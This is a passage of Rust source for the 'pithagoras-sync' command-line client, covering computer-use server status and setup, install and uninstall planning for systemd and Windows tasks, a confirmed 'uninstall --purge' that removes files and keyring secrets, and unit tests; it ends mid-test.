async fn computer_use_status(dirs: &Dirs, json: bool) -> Result<ExitCode, String> {
    use crate::computer_use as cu;
    let cfg = load_config(dirs)?;
    let doc = cu::store(dirs).current();
    let running = match control::send(&dirs.socket(), Request::McpStatus { probe: true }).await {
        Ok(Some(r)) if r.ok => r.mcp,
        _ => None,
    };
    let pinned = cu::pinned(&doc);
    let installed = cfg.mcp.iter().next();
    let files = installed.map(|(n, r)| {
        sync_mcp::install::verify(&dirs.mcp_dir(), n, &r.version, &r.sha256).map(|_| ())
    });
    let setup = cu::installed(dirs, &cfg)
        .map(|(_, dir, pin)| cu::setup_state(&dir, &pin))
        .unwrap_or_default();
    if json {
        let v = serde_json::json!({
            "consent": cu::consent_text(&cfg, now_ms()),
            "installed": installed.map(|(n, r)| serde_json::json!({"name": n, "version": r.version, "serial": r.serial, "previous": r.previous.as_ref().map(|p| &p.version)})),
            "files": files.as_ref().map(|f| f.clone().err().unwrap_or_else(|| "checked".into())),
            "pinned": pinned.map(|p| serde_json::json!({"name": p.name, "version": p.version, "serial": doc.serial, "unpinned": p.unpinned(sync_mcp::arch())})),
            "running": running,
            "setup": setup,
        });
        println!("{}", serde_json::to_string_pretty(&v).unwrap_or_default());
        return Ok(ExitCode::SUCCESS);
    }
    println!("Consent: {}", cu::consent_text(&cfg, now_ms()));
    match pinned {
        Some(p) => println!(
            "Pinned: {} {} ({} pins, serial {}){}",
            p.name,
            p.version,
            if doc.serial == 0 {
                "built-in"
            } else {
                "signed"
            },
            doc.serial,
            p.unpinned(sync_mcp::arch())
                .map(|w| format!("; not installable yet: {w}"))
                .unwrap_or_default()
        ),
        None => println!("Pinned: nothing for this platform"),
    }
    match installed {
        None => println!("Installed: nothing (`pithagoras-sync computer-use install`)"),
        Some((n, r)) => {
            println!(
                "Installed: {n} {}{}",
                r.version,
                r.previous
                    .as_ref()
                    .map(|p| format!(" (rollback to {})", p.version))
                    .unwrap_or_default()
            );
            match files.unwrap_or(Ok(())) {
                Ok(()) => println!("Files: as installed (hash checked)"),
                Err(e) => println!("Files: {e}"),
            }
        }
    }
    match &running {
        None => println!("Server: the client is not running, so nothing runs the server"),
        Some(m) => {
            for s in &m.servers {
                let state = match (&s.error, s.running, &s.last_error) {
                    (Some(e), _, _) => format!("unavailable: {e}"),
                    (None, true, _) => "answers".to_string(),
                    (None, false, Some(e)) => format!(
                        "does not answer: {e}{}",
                        s.retry_in_secs
                            .map(|r| format!(" (tried again in {r}s)"))
                            .unwrap_or_default()
                    ),
                    (None, false, None) => "not started".to_string(),
                };
                println!("Server: {} {}: {state}", s.name, s.version);
                println!("Allowed tools: {}", s.tools.join(", "));
            }
            if let Some(u) = &m.in_use {
                println!(
                    "In use: chat {} (last call {})",
                    sync_policy::approve::visible(&u.chat),
                    crate::update::utc((u.last_ms / 1000).max(0) as u64)
                );
            }
            if let Some(u) = &m.last_update {
                println!("Last look for new pins: {u}");
            }
        }
    }
    if !setup.is_empty() {
        println!("Setup ({}):", sync_mcp::setup::desktop());
        for (t, st) in setup {
            println!("  {t}: {st}");
        }
    }
    println!(
        "Daily look for new pins: {}",
        if cfg.policy.computer_use.auto_update {
            "on"
        } else {
            "off"
        }
    );
    Ok(ExitCode::SUCCESS)
}

fn computer_use_setup(dirs: &Dirs, yes: bool) -> Result<(), String> {
    use crate::computer_use as cu;
    let cfg = load_config(dirs)?;
    let (name, dir, pin) = cu::installed(dirs, &cfg)?;
    let desktop = sync_mcp::setup::desktop();
    let steps = sync_mcp::setup::steps_for(&pin, &desktop);
    println!(
        "Setup of {name} on this desktop ({}):",
        if desktop.is_empty() {
            "unknown"
        } else {
            &desktop
        }
    );
    if desktop == "kde" {
        println!("KDE Plasma is not validated: the steps follow the server's README, untried.");
    }
    for (i, s) in steps.iter().enumerate() {
        println!("\n{}. {}", i + 1, s.title);
        println!("{}", s.text);
        let done = match sync_mcp::setup::check(s, &dir) {
            Some(Ok(true)) => {
                println!("Done.");
                continue;
            }
            Some(Ok(false)) => false,
            Some(Err(e)) => {
                println!("Could not check it: {e}");
                false
            }
            None => false,
        };
        let Some(run) = &s.run else {
            println!("This step is done by hand.");
            continue;
        };
        let argv = sync_mcp::setup::argv(run, &dir).join(" ");
        if !done && (yes || ask(&format!("Run `{argv}` now?"))) {
            match sync_mcp::setup::apply(s, &dir) {
                Ok(()) => println!("Done: {argv}"),
                Err(e) => println!("It failed: {e}"),
            }
        } else {
            println!("Not changed. By hand: {argv}");
        }
    }
    println!("\nThen: `pithagoras-sync computer-use test`.");
    Ok(())
}

/// `$XDG_DATA_HOME`, or `~/.local/share`: where desktop entries and icons go.
pub fn data_home(home: &Path) -> PathBuf {
    std::env::var_os("XDG_DATA_HOME")
        .map(PathBuf::from)
        .filter(|p| p.is_absolute())
        .unwrap_or_else(|| home.join(".local/share"))
}

/// `$XDG_CONFIG_HOME`, or `~/.config`: where the desktop keeps its list of
/// default programs.
pub fn config_home(home: &Path) -> PathBuf {
    std::env::var_os("XDG_CONFIG_HOME")
        .map(PathBuf::from)
        .filter(|p| p.is_absolute())
        .unwrap_or_else(|| home.join(".config"))
}

/// Whether `install` left a desktop entry, an icon or the link handler in the
/// desktop's list of default programs here.
fn desktop_installed(data: &Path, config: &Path) -> bool {
    data.join("applications")
        .join(install::DESKTOP_FILE)
        .exists()
        || install::icon_paths(data).iter().any(|p| p.exists())
        || install::mime_handler_left(config)
}

pub(crate) fn install_plan(
    system: bool,
    user: Option<&str>,
    linger: bool,
    exe: &Path,
) -> Result<Vec<Action>, String> {
    if cfg!(windows) {
        if system {
            return Err("on Windows the client runs as a logon task of the current user; there is no --system".into());
        }
        let local = std::env::var("LOCALAPPDATA").map_err(|_| "LOCALAPPDATA is not set")?;
        #[cfg(windows)]
        let user_id = install::current_user_sid()?;
        #[cfg(not(windows))]
        let user_id = String::new();
        return Ok(install::windows_plan(&local, exe, &user_id));
    }
    if system {
        if !is_root() {
            return Err("--system needs root: sudo pithagoras-sync install --system".into());
        }
        if let Some(u) = user {
            actions::System
                .run(&actions::argv(&["getent", "passwd", u]))
                .map_err(|_| format!("there is no user {u}"))?;
        } else if !Dirs::from_env()
            .and_then(|d| load_config(&d))
            .is_ok_and(|c| c.policy.privilege.allow_root)
        {
            // The client would refuse to start, and the unit restart it forever.
            return Err("the root variant runs the client as root, which it refuses until you allow it: pithagoras-sync config set policy.privilege.allow_root true (or use --user <name>)".into());
        }
        return Ok(install::system_plan(exe, user));
    }
    if is_root() {
        return Err(
            "as root, install a system unit: sudo pithagoras-sync install --system [--user <name>]"
                .into(),
        );
    }
    let home = info::home().ok_or("cannot find the home directory")?;
    let headless = info::session() == "headless";
    let linger = linger && headless;
    let mut plan = install::user_plan(&home, exe, &info::user().0, linger);
    // In a graphical session: the menu entry and the handler of pairing links.
    if !headless {
        let program = install::user_program(&home);
        let data = data_home(&home);
        let cache = install::icon_cache(&data).exists();
        plan.extend(install::desktop_plan(&data, &program, cache)?);
    }
    Ok(plan)
}

pub(crate) fn uninstall_plan(system: bool) -> Result<Vec<Action>, String> {
    if cfg!(windows) {
        let local = std::env::var("LOCALAPPDATA").map_err(|_| "LOCALAPPDATA is not set")?;
        let task = install::task_installed(&actions::System);
        return Ok(install::windows_uninstall_plan(&local, task));
    }
    if system {
        if !is_root() {
            return Err("--system needs root".into());
        }
        return Ok(install::system_uninstall_plan());
    }
    let home = info::home().ok_or("cannot find the home directory")?;
    let mut plan = install::user_uninstall_plan(&home);
    let (data, config) = (data_home(&home), config_home(&home));
    if desktop_installed(&data, &config) {
        plan.extend(install::desktop_uninstall_plan(
            &data,
            &config,
            install::icon_cache(&data).exists(),
        ));
    }
    Ok(plan)
}

/// Asks the running client to exit and waits until it has, so it does not write
/// its files again while `uninstall --purge` removes them.
async fn stop_client(dirs: &Dirs) -> Result<(), String> {
    let socket = dirs.socket();
    let Some(r) = control::send(&socket, Request::Restart).await? else {
        return Ok(());
    };
    if !r.ok {
        return Err(format!(
            "the running client did not stop ({}): nothing was removed",
            r.error.unwrap_or_default()
        ));
    }
    for _ in 0..150 {
        // While it shuts down, a client may take a connection and drop it.
        if let Ok(None) = control::send(&socket, Request::Status).await {
            return Ok(());
        }
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    }
    Err("the running client did not stop within 15 s: nothing was removed. Stop it first".into())
}

/// What an error of `uninstall --purge` after the stop says about the unit or
/// task, which was as `before` says before the stop (`None`: there was none to
/// stop): off as it was, how to put it back as it was, or deleted already.
fn stop_note(
    before: Option<install::Before>,
    deleted: bool,
    windows: bool,
    system: bool,
) -> String {
    let Some(before) = before else {
        return String::new();
    };
    if deleted {
        "\nThe unit or task is deleted already: `install` sets it up again.".into()
    } else if windows && !before.enabled && before.running {
        // Nothing can start it: a switched-off task cannot be run, and the
        // client was not the task's.
        "\nThe logon task stays switched off, as it was before. The client that was running was stopped, and nothing starts it while the task is off: `pithagoras-sync run` starts it again.".into()
    } else if windows && !before.enabled {
        "\nThe logon task stays switched off, as it was before.".into()
    } else if windows {
        // The name has a space.
        format!(
            "\nThe logon task was switched off: `schtasks /Change /TN \"{}\" /ENABLE` turns it on again.",
            install::TASK_NAME
        )
    } else {
        let what = match (before.enabled, before.running) {
            (true, true) => "enable --now",
            (true, false) => "enable",
            (false, true) => "start",
            (false, false) => return "\nThe unit stays off, as it was before.".into(),
        };
        format!(
            "\nThe unit is off now: `{} {what} {}` puts it back as it was.",
            if system {
                "sudo systemctl"
            } else {
                "systemctl --user"
            },
            install::UNIT_NAME
        )
    }
}

/// How to delete `path` by hand, for the owner to copy.
fn delete_hint(path: &Path) -> String {
    let p = path.to_string_lossy();
    if cfg!(windows) {
        format!("Remove-Item -LiteralPath '{}'", p.replace('\'', "''"))
    } else {
        actions::shell_words(&["rm".to_string(), p.into_owned()])
    }
}

/// What an error of `uninstall --purge` after the stop says, once it put back
/// what the stop changed where the unit or task is still `installed`: switched
/// on again if it was on, and started again if a client ran, so a purge that
/// failed neither leaves the device offline nor brings back what the owner had
/// switched off. Only when that fails too, how to do it by hand.
fn after_stop_note(
    before: Option<install::Before>,
    installed: bool,
    windows: bool,
    system: bool,
    runner: &dyn actions::Runner,
) -> String {
    let Some(b) = before.filter(|_| installed) else {
        return stop_note(before, !installed, windows, system);
    };
    let plan = install::restart_plan(windows, system, b);
    if plan.is_empty() {
        return stop_note(before, false, windows, system);
    }
    match actions::apply(&plan, Path::new("/"), runner) {
        Ok(_) if windows && b.running => {
            "\nThe logon task was switched on again and starts the client.".into()
        }
        Ok(_) if windows => "\nThe logon task was switched on again.".into(),
        Ok(_) => match (b.enabled, b.running) {
            (true, true) => "\nThe unit was switched on and started again.".into(),
            (true, false) => "\nThe unit was switched on again.".into(),
            _ => "\nThe unit was started again.".into(),
        },
        Err(_) => stop_note(before, false, windows, system),
    }
}

/// `uninstall --purge`: stops the client, undoes `install`, and removes what the
/// client wrote for this user. The program stays: it may be the owner's only
/// copy, and on Windows the running one cannot be deleted anyway. The hints of
/// the steps it ran go to `hints`, also when it fails. In the `window` nothing
/// is printed: what it would print for the owner goes to `hints`, but the plan,
/// the pairing and the program, which the window says in its own words.
pub(crate) async fn purge(
    dirs: &Dirs,
    system: bool,
    print: bool,
    yes: bool,
    window: bool,
    hints: &mut Vec<String>,
) -> Result<ExitCode, String> {
    // A window has no terminal to print to.
    macro_rules! say {
        ($($arg:tt)*) => {
            if !window {
                println!($($arg)*);
            }
        };
    }
    let linux = cfg!(target_os = "linux");
    if cfg!(windows) && system {
        return Err(
            "on Windows the client runs as a logon task of the current user; there is no --system"
                .into(),
        );
    }
    if system && !is_root() {
        return Err("--system needs root".into());
    }
    // An agent's commands have the same account and can turn a client folder
    // into a junction while an elevated purge deletes in it.
    if cfg!(windows) && is_root() {
        return Err("run this from a normal shell, not an elevated one: the commands an agent runs could turn the client's folders into links while it deletes in them".into());
    }
    owner::not_from_own_command(dirs).await?;
    let runner = actions::System;
    let me = info::user().0;
    let unit_file = crate::update::system_unit_file();
    let unit_user = linux
        .then(|| std::fs::read_to_string(&unit_file).ok())
        .flatten()
        .and_then(|u| install::unit_user(&u));
    // The system unit would start this user's client again after it stops, and
    // only root can stop it.
    let units_mine = !system && unit_user.as_deref() == Some(me.as_str());
    // `is-active` says no for a unit that is between two starts (`activating`),
    // which comes back within seconds: only a unit that is down counts as stopped.
    if units_mine
        && runner
            .try_run(&actions::argv(&[
                "systemctl",
                "show",
                "-p",
                "ActiveState",
                "--value",
                install::UNIT_NAME,
            ]))
            .is_ok_and(|s| !matches!(s.trim(), "" | "inactive" | "failed"))
    {
        return Err(format!(
            "{} runs the client as {me}, and it would start it again: {}",
            install::UNIT_NAME,
            if is_root() {
                "run `pithagoras-sync uninstall --system --purge` instead".to_string()
            } else {
                format!(
                    "stop it first with `sudo systemctl disable --now {}` (or remove the user with `sudo pithagoras-sync setup --remove --name {me}`)",
                    install::UNIT_NAME
                )
            }
        ));
    }
    let home = info::home();
    let unit_folder = if system {
        Some(Path::new("/etc/systemd/system").to_path_buf())
    } else {
        home.as_ref().map(|h| install::user_unit_folder(h))
    };
    let is_installed = || {
        if cfg!(windows) {
            install::task_installed(&runner)
        } else {
            unit_folder
                .as_ref()
                .is_some_and(|d| d.join(install::UNIT_NAME).exists())
        }
    };
    let installed = is_installed();
    let (stop, uninstall) = if !installed {
        // A link handler left without the unit or task (removed by hand).
        let mut links = Vec::new();
        #[cfg(windows)]
        if crate::registry::exists(install::WINDOWS_CLASS_KEY) {
            links = install::windows_link_uninstall_plan();
        }
        if let Some((data, config)) = home
            .as_ref()
            .filter(|_| linux && !system)
            .map(|h| (data_home(h), config_home(h)))
            && desktop_installed(&data, &config)
        {
            links = install::desktop_uninstall_plan(
                &data,
                &config,
                install::icon_cache(&data).exists(),
            );
        }
        (Vec::new(), links)
    } else if cfg!(windows) {
        (install::windows_stop_plan(), uninstall_plan(false)?)
    } else if system {
        (install::system_stop_plan(), uninstall_plan(true)?)
    } else {
        (install::user_stop_plan(), uninstall_plan(false)?)
    };
    let uninstall = not_again(&stop, uninstall);
    let found = crate::purge::find(dirs)?;
    let me_exe = this_program()?;
    let mut programs = vec![me_exe.clone()];
    let copy = if system {
        Some(PathBuf::from(install::SYSTEM_BIN))
            .filter(|p| p.is_file() && !crate::update::same_program(p, &me_exe))
    } else {
        crate::update::installed_copy(&me_exe)
    };
    programs.extend(copy);
    // Windows leaves the program that `update` or `install` replaced next to it.
    let olds: Vec<PathBuf> = programs
        .iter()
        .map(|p| crate::update::old_path(p))
        .filter(|p| cfg!(windows) && p.is_file())
        .collect();
    let running = control::send(&dirs.socket(), Request::Status)
        .await?
        .and_then(|r| r.status);
    let config = DeviceConfig::load(&dirs.config_file()).ok();
    let portal = config.as_ref().and_then(|c| c.portal.clone());
    // What the keyring keeps for the client, asked without a prompt: an entry
    // where the config puts it, or one an earlier setting left. The token store
    // decides for the token, as `unpair` does. For the password, a keyring that
    // cannot answer is taken to hold it where the config puts it there;
    // removing it then fails with the reason.
    let keyring = sync_policy::keyring::system(dirs);
    let tokens = token_store(dirs, config.as_ref().unwrap_or(&DeviceConfig::default()));
    let keyring_token = tokens.keyring_holds(portal.is_some()).await;
    let password_setting = config.as_ref().is_some_and(|c| {
        c.policy.privilege.secret_storage == sync_policy::config::SecretStorage::Keyring
    });
    let keyring_password = linux
        && keyring
            .has(crate::secrets::ELEVATION)
            .await
            .unwrap_or(password_setting);

    let mut notes = Vec::new();
    // The window says these two in its own words: the pairing ends, the
    // program stays.
    let mut own_words = 0;
    if let Some(p) = &portal {
        own_words += 1;
        notes.push(format!(
            "The pairing with {} (device {}) ends here: remove the device in the portal as well (Settings, Devices).",
            sync_policy::approve::visible(&p.url),
            sync_policy::approve::visible(&p.device_id)
        ));
    }
    if let Some(d) = unit_folder
        .as_ref()
        .map(|d| d.join(format!("{}.d", install::UNIT_NAME)))
        && d.exists()
    {
        notes.push(format!(
            "The drop-ins in {} stay: they are yours, `install` writes none.",
            d.display()
        ));
    }
    if units_mine {
        notes.push(format!(
            "{} (root's) stays: `sudo pithagoras-sync uninstall --system` removes it.",
            unit_file.display()
        ));
    }
    if linux && !system && Path::new("/var/lib/systemd/linger").join(&me).exists() {
        notes.push(format!(
            "Lingering stays on for {me}: `install` turns it on where there is no desktop, but something else may need it too. If nothing does: sudo loginctl disable-linger {me}"
        ));
    }
    if system && let Some(u) = unit_user.as_deref().filter(|u| *u != "root") {
        notes.push(format!(
            "The user {u} and the files of its client stay: `sudo pithagoras-sync setup --remove --name {u}` removes them."
        ));
    }
    let extra = own_words..notes.len();
    for p in &programs {
        notes.push(format!(
            "The program itself stays: {}. Delete it with `{}` when you no longer need it.",
            p.display(),
            delete_hint(p)
        ));
    }
    if window {
        hints.extend(notes[extra].iter().cloned());
    }

    if running.is_none()
        && stop.is_empty()
        && uninstall.is_empty()
        && found.is_empty()
        && olds.is_empty()
        && !keyring_token
        && !keyring_password
    {
        say!("Nothing to remove.");
        for n in &notes {
            say!("{n}");
        }
        return Ok(ExitCode::SUCCESS);
    }
    say!("This removes:");
    if let Some(s) = &running {
        say!("  - stop the running client (pid {})", s.pid);
    }
    if !window {
        show_plan(&stop);
        show_plan(&uninstall);
    }
    // The uninstall's own removals are listed with it already.
    let removed_by_uninstall = |e: &Path| {
        uninstall
            .iter()
            .any(|a| matches!(a, Action::Remove { path } if path == e))
    };
    for e in found.entries.iter().filter(|e| !removed_by_uninstall(e)) {
        say!(
            "  - remove {}{}",
            e.display(),
            if std::fs::symlink_metadata(e).is_ok_and(|m| m.is_dir()) {
                " and what is in it"
            } else {
                ""
            }
        );
    }
    for p in &olds {
        say!("  - remove {}", p.display());
    }
    if keyring_token {
        say!("  - remove the connector token from the keyring");
    }
    if keyring_password {
        say!("  - remove the elevation password from the keyring");
    }
    for f in &found.folders {
        say!(
            "  - remove the folder {} once nothing else is in it",
            f.display()
        );
    }
    for n in &notes {
        say!("{n}");
    }
    if print {
        return Ok(ExitCode::SUCCESS);
    }
    if !yes && !ask("Go ahead?") {
        say!("Nothing changed.");
        return Ok(ExitCode::from(1));
    }
    let mut apply = |plan: &[Action]| -> Result<(), String> {
        hints.extend(actions::apply(plan, Path::new("/"), &actions::System)?);
        Ok(())
    };
    // What the unit or task is before the stop, so a purge that fails puts
    // back only that.
    let before = (!stop.is_empty())
        .then(|| install::state_before(cfg!(windows), system, &runner, running.is_some()));
    apply(&stop)?;
    // From here on an error comes after the unit or task was stopped, and may
    // come after part of it was removed: it says so, and that running this again
    // goes on. Once the unit or task is deleted it says that instead.
    let deleted = std::cell::Cell::new(false);
    let after_stop = |e: String| {
        let note = after_stop_note(
            before,
            !deleted.get() && is_installed(),
            cfg!(windows),
            system,
            &runner,
        );
        format!("{e}{note}\nRun this again to go on with what is left.")
    };
    stop_client(dirs).await.map_err(after_stop)?;
    // What was made while the question waited and the client shut down is the
    // client's too.
    let found = crate::purge::find(dirs).map_err(after_stop)?;
    apply(&uninstall).map_err(after_stop)?;
    deleted.set(true);
    // The keyring first: the config that says what is there goes with the files.
    if keyring_token {
        tokens.delete().await.map_err(after_stop)?;
    }
    if keyring_password {
        crate::secrets::forget(
            dirs,
            sync_policy::config::SecretStorage::Keyring,
            keyring.as_ref(),
        )
        .await
        .map_err(after_stop)?;
    }
    for p in &olds {
        match std::fs::remove_file(p) {
            Err(e) if e.kind() != std::io::ErrorKind::NotFound => {
                return Err(after_stop(format!("{}: {e}", p.display())));
            }
            _ => {}
        }
    }
    for f in crate::purge::remove(&found).map_err(after_stop)? {
        let kept = format!("Kept {}: something in it is not the client's.", f.display());
        if window {
            hints.push(kept);
        } else {
            println!("{kept}");
        }
    }
    say!("Removed.");
    Ok(ExitCode::SUCCESS)
}

use crate::actions::Runner as _;

#[cfg(test)]
mod tests {
    use super::{
        Cli, SudoView, approval_text, root_warning, status_text, stop_note, sudo_status_text,
        sudo_supported, the_version_asked_about,
    };
    use crate::control::Status;
    use clap::{CommandFactory, Parser};
    use sync_connector::{LinkState, LinkStatus};

    #[test]
    fn only_the_short_commands_die_on_sigpipe() {
        let cmd = |args: &[&str]| {
            let argv: Vec<&str> = std::iter::once("pithagoras-sync")
                .chain(args.iter().copied())
                .collect();
            Cli::try_parse_from(argv).unwrap().cmd
        };
        for args in [&[][..], &["gui"], &["run"]] {
            assert!(!super::dies_on_sigpipe(cmd(args).as_ref()), "{args:?}");
        }
        for args in [&["status"][..], &["folder", "list"]] {
            assert!(super::dies_on_sigpipe(cmd(args).as_ref()), "{args:?}");
        }
    }

    #[test]
    fn a_lone_argument_is_a_link_only_with_the_scheme() {
        let a = |s: &str| super::link_argument(&["pithagoras-sync".into(), s.into()]);
        assert_eq!(
            a("Pithagoras-Sync://pair?x").as_deref(),
            Some("Pithagoras-Sync://pair?x")
        );
        assert_eq!(a("status"), None);
        // The scheme's length ends inside a character: no link, and no panic.
        assert_eq!(a(&format!("{}é", "a".repeat(15))), None);
    }
    use sync_policy::config::SecretStorage;
    use sync_proto::methods::{Access, ApprovalInfo, Choice, FolderInfo};

    fn view(active: bool, password: bool) -> SudoView {
        SudoView {
            active,
            password,
            storage: SecretStorage::Memory,
            running: true,
            root: false,
            allow_root: false,
            leftover_file: false,
        }
    }

    #[test]
    fn sudo_status_names_the_step_that_fits() {
        let t = sudo_status_text(&view(false, false));
        assert!(t.contains("Sudo access: not active"), "{t}");
        assert!(t.contains("Password:    not set"), "{t}");
        assert!(t.contains("run `pithagoras-sync sudo set`"), "{t}");
        let t = sudo_status_text(&view(false, true));
        assert!(t.contains("Password:    set (kept in memory)"), "{t}");
        assert!(t.contains("run `pithagoras-sync sudo activate`"), "{t}");
        let t = sudo_status_text(&view(true, false));
        assert!(t.contains("Sudo access: active"), "{t}");
        assert!(t.contains("active, but no password: run `pithagoras-sync sudo set`"));
        let t = sudo_status_text(&view(true, true));
        assert!(t.contains("nothing to do"), "{t}");
        assert!(t.contains("sudo deactivate"), "{t}");
        // Where the password is kept, and a client that is down.
        let t = sudo_status_text(&SudoView {
            storage: SecretStorage::File,
            ..view(true, true)
        });
        assert!(t.contains("set (kept in file)"), "{t}");
        let t = sudo_status_text(&SudoView {
            running: false,
            ..view(false, false)
        });
        assert!(t.contains("Client:      not running"), "{t}");
        assert!(t.contains("memory only"), "{t}");
        assert!(!t.contains("old password file"), "{t}");
        // A password file the client will not load (memory storage) is named.
        let t = sudo_status_text(&SudoView {
            running: false,
            leftover_file: true,
            ..view(false, false)
        });
        assert!(t.contains("old password file is ignored"), "{t}");
        assert!(t.contains("sudo clear"), "{t}");
    }

    #[test]
    fn sudo_status_says_a_root_client_has_nothing_to_elevate() {
        let t = sudo_status_text(&SudoView {
            root: true,
            ..view(false, false)
        });
        assert!(t.contains("runs as root"), "{t}");
        assert!(t.contains("nothing to elevate"), "{t}");
        assert!(!t.contains("sudo set"), "{t}");
    }

    #[test]
    fn sudo_status_does_not_say_a_root_client_runs_when_it_does_not() {
        // The client refuses to start as root until allow_root is on.
        let t = sudo_status_text(&SudoView {
            root: true,
            running: false,
            ..view(false, false)
        });
        assert!(!t.contains("runs as root"), "{t}");
        assert!(!t.contains("memory only"), "{t}");
        assert!(t.contains("Client:      not running"), "{t}");
        assert!(t.contains("refuses to run as root"), "{t}");
        assert!(t.contains("policy.privilege.allow_root true"), "{t}");
        assert!(!t.contains("nothing to do"), "{t}");
        // Allowed, but not started yet.
        let t = sudo_status_text(&SudoView {
            root: true,
            running: false,
            allow_root: true,
            ..view(false, false)
        });
        assert!(!t.contains("runs as root"), "{t}");
        assert!(t.contains("Client:      not running"), "{t}");
        assert!(!t.contains("refuses"), "{t}");
        assert!(t.contains("start the client"), "{t}");
    }

    #[test]
    fn sudo_is_linux_only() {
        assert!(sudo_supported(true).is_ok());
        let e = sudo_supported(false).unwrap_err();
        assert!(e.contains("Linux only"), "{e}");
    }

    fn long_help(name: &str) -> String {
        Cli::command()
            .find_subcommand(name)
            .unwrap()
            .clone()
            .render_long_help()
            .to_string()
    }

    #[test]
    fn run_says_the_client_starts_without_it() {
        let help = long_help("run");
        assert!(help.contains("by hand"), "{help}");
        assert!(
            help.contains("`install` already starts the client"),
            "{help}"
        );
        assert!(help.contains("never need this"), "{help}");
        // The list of commands shows the short form, which says the same.
        let list = Cli::command().render_help().to_string();
        assert!(list.contains("by hand (for debugging)"), "{list}");
    }

    #[test]
    fn mode_help_explains_the_three_modes() {
        let help = long_help("mode");
        for word in [
            "ask      Every file access and every command asks you",
            "`folder add`",
            "Landlock",
            "without Landlock each",
            "`policy.allow_globs`",
            "`policy.commands.never_ask`",
            "`policy.full.taint_prompts`",
            "`policy.commands.always_ask`",
            "every `sudo` command while",
            "--expiry-hours (default 8; 0 never)",
            "shows the current one",
            "`portal_policy` to `write`",
        ] {
            assert!(help.contains(word), "{word}: {help}");
        }
        // Each value has its own line too.
        assert!(help.contains("- folders:"), "{help}");
    }

    #[test]
    fn the_sudo_group_replaces_secret() {
        for args in [
            ["sudo", "set", "--stdin"].as_slice(),
            &["sudo", "set", "--activate"],
            &["sudo", "activate", "--no-password"],
            &["sudo", "deactivate"],
            &["sudo", "clear", "--deactivate"],
            &["sudo", "status"],
        ] {
            let mut argv = vec!["pithagoras-sync"];
            argv.extend(args);
            assert!(Cli::try_parse_from(&argv).is_ok(), "{args:?}");
        }
        // `secret` is gone, with no alias; a bare `sudo` shows its help.
        assert!(Cli::try_parse_from(["pithagoras-sync", "secret", "status"]).is_err());
        let e = Cli::try_parse_from(["pithagoras-sync", "sudo"])
            .err()
            .unwrap();
        assert_eq!(
            e.kind(),
            clap::error::ErrorKind::DisplayHelpOnMissingArgumentOrSubcommand
        );
        let cmd = Cli::command();
        let help = long_help("sudo");
        for word in ["set", "activate", "deactivate", "clear", "status"] {
            assert!(help.contains(word), "{help}");
        }
        // What the help does not hide: never_ask and a root client skip the
        // question, the password stays after `deactivate`, and the portal may
        // switch it on again.
        let sub = |name: &str| {
            cmd.find_subcommand("sudo")
                .unwrap()
                .find_subcommand(name)
                .unwrap()
                .clone()
                .render_long_help()
                .to_string()
        };
        let help = sub("activate");
        for word in ["`policy.commands.never_ask`", "runs as root"] {
            assert!(help.contains(word), "{word}: {help}");
        }
        let help = sub("deactivate");
        for word in ["stored password stays", "`portal_policy = write`"] {
            assert!(help.contains(word), "{word}: {help}");
        }
        assert!(cmd.find_subcommand("secret").is_none());
    }

    /// A purge that fails after the stop while the unit or task is still there
    /// puts back what was on before, and nothing else: a task or unit the
    /// owner had switched off stays off, and a client that was not running is
    /// not started. Only when putting back fails it says how.
    #[test]
    fn a_failed_purge_puts_back_only_what_was_on() {
        use super::after_stop_note;
        use crate::actions::{Fake, argv};
        use crate::install::Before;
        let on = Before {
            enabled: true,
            running: true,
        };
        let off = Before {
            enabled: false,
            running: false,
        };
        let task = |a: &str| argv(&["schtasks", a, "/TN", "Pithagoras Sync"]);
        let mut enable = task("/Change");
        enable.push("/ENABLE".into());
        let fake = Fake::default();
        let n = after_stop_note(Some(on), true, true, false, &fake);
        assert_eq!(
            n,
            "\nThe logon task was switched on again and starts the client."
        );
        assert_eq!(*fake.ran.lock().unwrap(), [enable.clone(), task("/Run")]);
        // On, but no client ran: switched on, not run.
        let fake = Fake::default();
        let idle = Before {
            enabled: true,
            running: false,
        };
        let n = after_stop_note(Some(idle), true, true, false, &fake);
        assert_eq!(n, "\nThe logon task was switched on again.");
        assert_eq!(*fake.ran.lock().unwrap(), [enable.clone()]);
        // Switched off before: it stays so, whether a client ran beside it or
        // not. One that did was stopped and nothing can start it (a switched
        // off task cannot be run): the note says so and how to start it.
        for running in [false, true] {
            let fake = Fake::default();
            let b = Before {
                enabled: false,
                running,
            };
            let n = after_stop_note(Some(b), true, true, false, &fake);
            let off = "\nThe logon task stays switched off, as it was before.";
            if running {
                assert!(n.starts_with(off), "{n}");
                assert!(
                    n.contains("The client that was running was stopped")
                        && n.contains("`pithagoras-sync run` starts it again"),
                    "{n}"
                );
            } else {
                assert_eq!(n, off);
            }
            assert!(fake.ran.lock().unwrap().is_empty());
        }
        let fake = Fake {
            answers: vec![("schtasks /Change".into(), Err("refused".into()))],
            ..Fake::default()
        };
        let n = after_stop_note(Some(on), true, true, false, &fake);
        assert!(
            n.contains("/TN \"Pithagoras Sync\" /ENABLE` turns it on"),
            "{n}"
        );
        for system in [false, true] {
            let systemctl = |what: &str| {
                let mut a = vec!["systemctl"];
                if !system {
                    a.push("--user");
                }
                a.extend([what, "pithagoras-sync.service"]);
                argv(&a)
            };
            for (b, ran, said) in [
                (
                    on,
                    vec![systemctl("enable"), systemctl("start")],
                    "\nThe unit was switched on and started again.",
                ),
                (
                    Before {
                        enabled: true,
                        running: false,
                    },
                    vec![systemctl("enable")],
                    "\nThe unit was switched on again.",
                ),
                (
                    Before {
                        enabled: false,
                        running: true,
                    },
                    vec![systemctl("start")],
                    "\nThe unit was started again.",
                ),
                (off, vec![], "\nThe unit stays off, as it was before."),
            ] {
                let fake = Fake::default();
                let n = after_stop_note(Some(b), true, false, system, &fake);
                assert_eq!(n, said, "{b:?}");
                assert_eq!(*fake.ran.lock().unwrap(), ran, "{b:?}");
            }
        }
        // Nothing stopped, or deleted already: nothing to put back.
        for (before, installed) in [(None, true), (Some(on), false)] {
            let fake = Fake::default();
            let n = after_stop_note(before, installed, true, false, &fake);
            assert_eq!(n, stop_note(before, !installed, true, false));
            assert!(fake.ran.lock().unwrap().is_empty());
        }
    }

    /// `uninstall --purge` on Windows ends the task once, in its stop.
    #[test]
    fn the_purge_ends_the_task_once() {
        use crate::actions::Action;
        use crate::install::{windows_stop_plan, windows_uninstall_plan};
        let stop = windows_stop_plan();
        let all: Vec<Action> = stop
            .iter()
            .cloned()
            .chain(super::not_again(
                &stop,
